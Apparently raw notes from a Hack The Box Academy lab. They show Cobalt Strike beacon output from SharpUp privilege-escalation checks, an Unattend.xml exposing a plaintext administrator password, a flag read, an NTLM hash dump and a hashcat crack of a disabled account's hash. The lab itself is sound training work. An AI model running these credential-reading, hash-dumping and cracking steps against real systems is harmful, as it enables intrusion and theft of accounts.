


```python
[05/12 12:19:19] beacon> execute-assembly /home/kali/SharpUp.exe audit
[05/12 12:19:19] [*] Tasked beacon to run .NET program: SharpUp.exe audit
[05/12 12:19:19] [+] host called home, sent: 148678 bytes
[05/12 12:19:20] [+] received output:


=== SharpUp: Running Privilege Escalation Checks ===

[!] Modifialbe scheduled tasks were not evaluated due to permissions.


[05/12 12:19:25] [+] received output:
[+] Hijackable DLL: C:\Users\htb-student\AppData\Local\Microsoft\OneDrive\21.083.0425.0003\amd64\FileSyncShell64.dll
[+] Associated Process is explorer with PID 4996 


[05/12 12:19:31] [+] received output:


=== Always Install Elevated ===

	HKCU: 1

	HKLM: 1





=== Unattended Install Files ===

	C:\Windows\Panther\Unattend.xml







[*] Completed Privesc Checks in 10 seconds



```











```
[05/12 12:05:32] beacon> run cmd.exe /c type C:\Windows\Panther\Unattend.xml
[05/12 12:05:32] [*] Tasked beacon to run: cmd.exe /c type C:\Windows\Panther\Unattend.xml
[05/12 12:05:32] [+] host called home, sent: 65 bytes
[05/12 12:05:34] [+] received output:
'\\tsclient\share'

CMD.EXE was started with the above path as the current directory.

UNC paths are not supported.  Defaulting to Windows directory.

<!--*************************************************

Installation Notes

Location: HQ

Notes: OOB installer for Inlanefreight Windows 10 systems.

**************************************************-->



<?xml version="1.0" encoding="utf-8"?>

<unattend xmlns="urn:schemas-microsoft-com:unattend">

<settings pass="windowsPE">

<component name="Microsoft-Windows-International-Core-WinPE" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">

<SetupUILanguage>

<UILanguage>en-US</UILanguage>

</SetupUILanguage>

<InputLocale>0409:00000409</InputLocale>

<SystemLocale>en-US</SystemLocale>

<UILanguage>en-US</UILanguage>

<UILanguageFallback>en-US</UILanguageFallback>

<UserLocale>en-US</UserLocale>

</component>

<component name="Microsoft-Windows-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">

<DiskConfiguration>

<Disk wcm:action="add">

<DiskID>0</DiskID>

<WillWipeDisk>true</WillWipeDisk>

<CreatePartitions>

<!-- Windows RE Tools partition -->

<CreatePartition wcm:action="add">

<Order>1</Order>

<Type>Primary</Type>

<Size>300</Size>

</CreatePartition>

<!-- System partition (ESP) -->

<CreatePartition wcm:action="add">

<Order>2</Order>

<Type>EFI</Type>

<Size>100</Size>

</CreatePartition>

<!-- Microsoft reserved partition (MSR) -->

<CreatePartition wcm:action="add">

<Order>3</Order>

<Type>MSR</Type>

<Size>128</Size>

</CreatePartition>

<!-- Windows partition -->

<CreatePartition wcm:action="add">

<Order>4</Order>

<Type>Primary</Type>

<Extend>true</Extend>

</CreatePartition>

</CreatePartitions>

<ModifyPartitions>

<!-- Windows RE Tools partition -->

<ModifyPartition wcm:action="add">

<Order>1</Order>

<PartitionID>1</PartitionID>

<Label>WINRE</Label>

<Format>NTFS</Format>

<TypeID>DE94BBA4-06D1-4D40-A16A-BFD50179D6AC</TypeID>

</ModifyPartition>

<!-- System partition (ESP) -->

<ModifyPartition wcm:action="add">

<Order>2</Order>

<PartitionID>2</PartitionID>

<Label>System</Label>

<Format>FAT32</Format>

</ModifyPartition>

<!-- MSR partition does not need to be modified -->

<ModifyPartition wcm:action="add">

<Order>3</Order>

<PartitionID>3</PartitionID>

</ModifyPartition>

<!-- Windows partition -->

<ModifyPartition wcm:action="add">

<Order>4</Order>

<PartitionID>4</PartitionID>

<Label>OS</Label>

<Letter>C</Letter>

<Format>NTFS</Format>

</ModifyPartition>

</ModifyPartitions>

</Disk>

</DiskConfiguration>

<ImageInstall>

<OSImage>

<InstallTo>

<DiskID>0</DiskID>

<PartitionID>4</PartitionID>

</InstallTo>

<InstallToAvailablePartition>false</InstallToAvailablePartition>

</OSImage>

</ImageInstall>

<UserData>

<ProductKey>

<!-- Do not uncomment the Key element if you are using trial ISOs -->

<!-- You must uncomment the Key element (and optionally insert your own key) if you are using retail or volume license ISOs -->

<Key></Key>

<WillShowUI>Never</WillShowUI>

</ProductKey>

<AcceptEula>true</AcceptEula>

<FullName>INLANEFREIGHT\iamtheadministrator</FullName>

<Organization>INLANEFREIGHT</Organization>

</UserData>

</component>

</settings>

<settings pass="offlineServicing">

<component name="Microsoft-Windows-LUA-Settings" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">

<EnableLUA>false</EnableLUA>

</component>

</settings>

<settings pass="generalize">

<component name="Microsoft-Windows-Security-SPP" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">

<SkipRearm>1</SkipRearm>

</component>

</settings>

<settings pass="specialize">

<component name="Microsoft-Windows-International-Core" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">

<InputLocale>0409:00000409</InputLocale>

<SystemLocale>en-US</SystemLocale>

<UILanguage>en-US</UILanguage>

<UILanguageFallback>en-US</UILanguageFallback>

<UserLocale>en-US</UserLocale>

</component>

<component name="Microsoft-Windows-Security-SPP-UX" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">

<SkipAutoActivation>true</SkipAutoActivation>

</component>

<component name="Microsoft-Windows-SQMApi" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">

<CEIPEnabled>0</CEIPEnabled>

</component>

<component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">

<ComputerName>WS001904</ComputerName>

<ProductKey>W269N-WFGWX-YVC9B-4J6C9-T83GX</ProductKey>

</component>

</settings>

<settings pass="oobeSystem">

<component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">

<AutoLogon>

<Password>

<Value>Inl@n3fr3ight_sup3rAdm1n!</Value>  <------

<PlainText>true</PlainText>

</Password>

<Enabled>false</Enabled>

<Username>INLANEFREIGHT\iamtheadministrator</Username>

</AutoLogon>

<OOBE>

<HideEULAPage>true</HideEULAPage>

<HideOEMRegistrationScreen>true</HideOEMRegistrationScreen>

<HideOnlineAccountScreens>true</HideOnlineAccountScreens>

<HideWirelessSetupInOOBE>true</HideWirelessSetupInOOBE>

<NetworkLocation>Work</NetworkLocation>

<SkipUserOOBE>true</SkipUserOOBE>

<SkipMachineOOBE>true</SkipMachineOOBE>

<ProtectYourPC>1</ProtectYourPC>

</OOBE>

<UserAccounts>

<LocalAccounts>

<LocalAccount wcm:action="add">

<Password>

<Value>Inl@n3fr3ight_sup3rAdm1n!</Value>

<PlainText>true</PlainText>

</Password>

<Description></Description>

<DisplayName>INLANEFREIGHT\iamtheadministrator</DisplayName>

<Group>Administrators</Group>

<Name>INLANEFREIGHT\iamtheadministrator</Name>

</LocalAccount>

</LocalAccounts>

</UserAccounts>

<RegisteredOrganization>INLANEFREIGHT</RegisteredOrganization>

<RegisteredOwner>INLANEFREIGHT\iamtheadministrator</RegisteredOwner>

<DisableAutoDaylightTimeSet>false</DisableAutoDaylightTimeSet>

<FirstLogonCommands>

<SynchronousCommand wcm:action="add">

<Description>Control Panel View</Description>

<Order>1</Order>

<CommandLine>reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\ControlPanel" /v StartupPage /t REG_DWORD /d 1 /f</CommandLine>

<RequiresUserInput>true</RequiresUserInput>

</SynchronousCommand>

<SynchronousCommand wcm:action="add">

<Order>2</Order>

<Description>Control Panel Icon Size</Description>

<RequiresUserInput>false</RequiresUserInput>

<CommandLine>reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\ControlPanel" /v AllItemsIconView /t REG_DWORD /d 0 /f</CommandLine>

</SynchronousCommand>

<SynchronousCommand wcm:action="add">

<Order>3</Order>

<RequiresUserInput>false</RequiresUserInput>

<CommandLine>cmd /C wmic useraccount where name="INLANEFREIGHT\iamtheadministrator" set PasswordExpires=false</CommandLine>

<Description>Password Never Expires</Description>

</SynchronousCommand>

</FirstLogonCommands>

<TimeZone>Eastern Standard Time</TimeZone>

</component>

</settings>

</unattend>
```











```python
[05/12 12:24:53] beacon> run cmd.exe /c type C:\Users\administrator\Desktop\flag.txt
[05/12 12:24:53] [*] Tasked beacon to run: cmd.exe /c type C:\Users\administrator\Desktop\flag.txt
[05/12 12:24:53] [+] host called home, sent: 73 bytes
[05/12 12:24:53] [+] received output:
el3vatEd_1nstall$_v3ry_r1sky
```



find the disabled account



```

[05/12 12:26:46] beacon> hashdump
[05/12 12:26:46] [*] Tasked beacon to dump hashes
[05/12 12:26:47] [+] host called home, sent: 83198 bytes
[05/12 12:26:48] [+] received password hashes:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb-student:1002:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
mrb3n:1001:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:aad797e20ba0675bbcb3e3df3319042c:::
wksadmin:1003:aad3b435b51404eeaad3b435b51404ee:5835048ce94ad0564e29a924a03510ef:::


```


```
[05/12 12:36:32] beacon> run cmd.exe /c wmic useraccount where name="wksadmin" get Name,Disabled
[05/12 12:36:32] [*] Tasked beacon to run: cmd.exe /c wmic useraccount where name="wksadmin" get Name,Disabled
[05/12 12:36:32] [+] host called home, sent: 85 bytes
[05/12 12:36:32] [+] received output:
Disabled  Name      

TRUE      wksadmin  


```



```
┌─[eu-academy-1]─[10.10.14.72]─[htb-ac330204@htb-nfqh0lv5es]─[~/pwdump8]
└──╼ [★]$ hashcat -m 1000 5835048CE94AD0564E29A924A03510EF /usr/share/wordlists/rockyou.txt 

<SNIP>

5835048ce94ad0564e29a924a03510ef:password1       

Session..........: hashcat
Status...........: Cracked
Hash.Name........: NTLM
Hash.Target......: 5835048ce94ad0564e29a924a03510ef
Time.Started.....: Mon Nov  7 15:27:12 2022 (1 sec)
Time.Estimated...: Mon Nov  7 15:27:13 2022 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    15791 H/s (0.46ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 4096/14344385 (0.03%)
Rejected.........: 0/4096 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 123456 -> oooooo

Started: Mon Nov  7 15:26:06 2022
Stopped: Mon Nov  7 15:27:15 2022

```